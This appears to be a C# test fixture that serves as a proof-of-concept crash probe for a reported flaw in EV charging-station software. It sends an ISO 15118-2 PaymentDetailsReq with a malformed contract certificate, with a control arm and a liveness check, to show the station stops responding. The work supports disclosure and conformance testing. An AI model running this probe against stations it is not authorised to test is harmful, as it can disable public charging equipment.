/*
 * Copyright (c) 2021-2026 GraphDefined GmbH <achim.friedland@graphdefined.com>
 * This file is part of WWCP ISO/IEC 15118 <https://github.com/OpenChargingCloud/WWCP_ISO15118>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

using NUnit.Framework;

using cloud.charging.open.protocols.ISO15118_2;
using cloud.charging.open.protocols.ISO15118_2.Generated;
using cloud.charging.open.protocols.ISO15118.EXI.Dispatch;
using cloud.charging.open.protocols.ISO15118.Framing;
using cloud.charging.open.protocols.ISO15118.Sap;
using cloud.charging.open.protocols.ISO15118.Session;
using cloud.charging.open.protocols.ISO15118.StateMachines;
using cloud.charging.open.protocols.ISO15118.Transport;

namespace ISO15118ConformanceTests.Simulation.Interop;

/// <summary>
/// The robustness probe behind
/// <c>docs/reports/everest-evsev2g-paymentdetails-crash.md</c>: an ISO 15118-2 Plug &amp; Charge session
/// carried as far as <c>PaymentDetailsReq</c>, whose <c>ContractSignatureCertChain.Certificate</c> is
/// then filled with bytes that are non-empty and not a certificate.
/// </summary>
/// <remarks>
/// <para>
/// <b>Why this does not go through <see cref="cloud.charging.open.protocols.ISO15118.StateMachines.Iso2.Evcc2"/>.</b>
/// Our car parses its own contract certificate before it sends it — <c>ContractEmaid()</c> needs the
/// Common Name — so it cannot carry bytes that do not parse, and teaching it to would put a
/// fault-injection switch into the program a user runs. The probe therefore builds its own five frames.
/// That is also what a security report wants: nothing here is a state machine doing something clever on
/// the way, and the frame on the wire is the frame written below.
/// </para>
/// <para>
/// <b>Two arms, and the control is the load-bearing one.</b> Both send a certificate the station must
/// reject; the only variable is whether the bytes <i>parse</i>. The control's certificate is well-formed,
/// self-signed and chains to nothing, so a station that answers it with a <c>FAILED</c> code has
/// demonstrated the whole path — TLS, SAP, service selection, <c>handle_iso_payment_details</c> — while
/// staying alive. Without it, a crash in the second arm could be a crash anywhere earlier.
/// </para>
/// <para>
/// <b>It is not a fuzzer</b> and deliberately sends one shape: 64 bytes that cannot be DER. The claim
/// under test is a use-before-check on one line, not a survey of parser inputs.
/// </para>
/// </remarks>
[TestFixture]
[Category("Interop")]
[Explicit("Sends a deliberately malformed certificate to a running station; never part of the offline CI run.")]
public class PaymentDetailsCrashProbe
{

    /// <summary>The eMAID travels beside the certificate and is not derived from it on the wire, so it
    /// stays schema-valid in both arms — 15 characters, per <c>eMAIDType</c>. A station that refused the
    /// message on the eMAID would refuse both arms identically and prove nothing.</summary>
    private const String Emaid = "DEABC0123456789";

    [Test]
    public async Task MalformedContractCertificate_AgainstTheirEvseV2G()
    {

        var endpoint = InteropEnvironment.SeccEndpointOrIgnore("their -2 station, with Plug & Charge over TLS");

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(120));

        // ── Arm A, the control: a certificate that parses and cannot be trusted ──────────────
        using var throwaway = SelfSignedContractLeaf();
        var control = await SendPaymentDetailsAsync(endpoint, throwaway.RawData, "control (well-formed, untrusted)", cts.Token);

        // ── Arm B, the probe: the same message, bytes that are not a certificate ─────────────
        var garbage = new Byte[64];
        RandomNumberGenerator.Fill(garbage);
        garbage[0] = 0xFF;   // 0x30 would at least start a DER SEQUENCE; this cannot be one.
        var probe = await SendPaymentDetailsAsync(endpoint, garbage, "probe (non-empty, unparseable)", cts.Token);

        // ── Then: is the station still there? ────────────────────────────────────────────────
        // The consequence, not the crash. A station that answered the control and then cannot be
        // reached is the whole finding; one that answers again has survived and the report is wrong.
        var liveness = await SendPaymentDetailsAsync(endpoint, throwaway.RawData, "liveness (control, repeated)", cts.Token);

        TestContext.Out.WriteLine("");
        TestContext.Out.WriteLine("=== what their station did ===");
        foreach (var arm in new[] { control, probe, liveness })
            TestContext.Out.WriteLine($"  {arm}");

        Assert.That(control.Answered, Is.True,
                    "the control arm never reached PaymentDetails — the probe below would prove nothing. " +
                    $"Station said: {control}");
    }


    /// <summary>
    /// One connection: TLS, SAP, SessionSetup, ServiceDiscovery, PaymentServiceSelection(Contract),
    /// PaymentDetails — and whatever comes back, including nothing.
    /// </summary>
    private static async Task<ArmResult> SendPaymentDetailsAsync(V2GEndpoint endpoint, Byte[] certificate,
                                                                 String label, CancellationToken ct)
    {
        try
        {
            using var socket = await TcpV2GClient.ConnectAsync(endpoint.ConnectHost, endpoint.Port,
                                                               InteropEnvironment.DevTlsOrNull(ProtocolVariant.Iso15118_2), ct);

            await SapHandshake.RunEvccSideAsync(socket, ProtocolVariant.Iso15118_2, ct);

            var session = new Iso2Exchange(socket);

            var setup = await session.SendAsync<SessionSetupResType>(
                            new SessionSetupReqType(EVCCID: [0xAB, 0xCD, 0xEF, 0x01, 0x02, 0x03]), ct);

            var discovery = await session.SendAsync<ServiceDiscoveryResType>(
                                new ServiceDiscoveryReqType(ServiceScope: null, ServiceCategory: null), ct);

            if (!discovery.PaymentOptionList.PaymentOption.Contains(PaymentOption.Contract))
                return new ArmResult(label, Answered: false,
                                     Detail: "the station does not offer Contract — PnC is off in this configuration, " +
                                             "so handle_iso_payment_details is unreachable");

            var chargeServiceId = discovery.ChargeService?.ServiceID
                ?? throw new SessionAborted("ServiceDiscovery: the station advertised no ChargeService.");

            await session.SendAsync<PaymentServiceSelectionResType>(
                new PaymentServiceSelectionReqType(PaymentOption.Contract,
                    new SelectedServiceListType([new SelectedServiceType(chargeServiceId, ParameterSetID: null)])), ct);

            // The one message this file exists for. No SubCertificates: the defect is in the leaf's parse.
            var details = await session.SendAsync<PaymentDetailsResType>(
                              new PaymentDetailsReqType(Emaid,
                                  new CertificateChainType(Id: null, certificate, SubCertificates: null)), ct);

            return new ArmResult(label, Answered: true,
                                 Detail: $"answered {details.ResponseCode}");
        }
        catch (SessionAborted refused)
        {
            // A FAILED response code is an answer, and a good one — the station stayed up and said no.
            return new ArmResult(label, Answered: true, Detail: $"refused the session: {refused.Message}");
        }
        catch (Exception ex)
        {
            return new ArmResult(label, Answered: false, Detail: $"{ex.GetType().Name}: {ex.Message}");
        }
    }


    /// <summary>
    /// A contract leaf that is a real certificate and vouched for by nobody: P-256, 15-character CN so
    /// the eMAID beside it is schema-valid, one hour of validity.
    /// </summary>
    private static X509Certificate2 SelfSignedContractLeaf()
    {
        using var key = ECDsa.Create(ECCurve.NamedCurves.nistP256);
        var request = new CertificateRequest($"CN={Emaid}, O=Probe, C=DE", key, HashAlgorithmName.SHA256);
        return request.CreateSelfSigned(DateTimeOffset.UtcNow.AddMinutes(-5), DateTimeOffset.UtcNow.AddHours(1));
    }


    private sealed record ArmResult(String Label, Boolean Answered, String Detail)
    {
        public override String ToString()
            => $"{Label,-38} {(Answered ? "ANSWERED" : "no answer")}  — {Detail}";
    }


    /// <summary>
    /// The three lines of session bookkeeping the probe needs and nothing else: frame it, send it, read
    /// the reply, adopt the station's session id.
    /// </summary>
    private sealed class Iso2Exchange(Stream stream)
    {
        private readonly Byte[] _buffer = new Byte[8192];
        private Byte[] _sessionId = new Byte[8];

        public async Task<T> SendAsync<T>(BodyBaseType body, CancellationToken ct) where T : BodyBaseType
        {
            var request = new V2G_Message(new MessageHeaderType(_sessionId, Notification: null, Signature: null),
                                          new BodyType(body));

            if (!request.TryEncode(_buffer, out var length))
                throw new InvalidOperationException("EXI encode failed.");

            await V2GTPStream.WriteFrameAsync(stream, MessageSet.Iso15118_2, _buffer.AsMemory(0, length), ct);

            var (set, message) = await V2GTPStream.ReadFrameAsync(stream, ct);
            if (set != MessageSet.Iso15118_2 || message is not V2G_Message reply)
                throw new SessionAborted($"expected an ISO 15118-2 reply, got {set}.");

            _sessionId = reply.Header.SessionID;

            if (reply.Body.BodyElement is not T typed)
                throw new SessionAborted($"expected {typeof(T).Name}, got {reply.Body.BodyElement?.GetType().Name}.");

            return typed;
        }
    }

}
